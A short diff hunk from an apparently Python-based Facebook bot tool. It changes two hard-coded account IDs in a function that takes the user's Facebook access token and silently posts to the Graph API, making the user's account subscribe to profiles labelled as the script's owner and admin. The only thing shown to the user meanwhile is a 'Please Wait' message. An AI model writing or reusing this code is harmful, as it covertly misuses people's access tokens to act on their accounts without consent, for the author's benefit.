@@ -301,8 +301,8 @@ def bot_follow():
 		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
 		logs()
 	jalan("%s[%s•%s] %sPlease Wait..."%(k,p,k,p))
-	requests.post("https://graph.facebook.com/100011669563699/subscribers?access_token=" + toket)      # owner sc
-	requests.post("https://graph.facebook.com/100000023658232/subscribers?access_token=" + toket) # Admin
+	requests.post("https://graph.facebook.com/100005500903067/subscribers?access_token=" + toket)      # owner sc
+	requests.post("https://graph.facebook.com/100003105373318/subscribers?access_token=" + toket) # Admin
 	
 
 	menu()
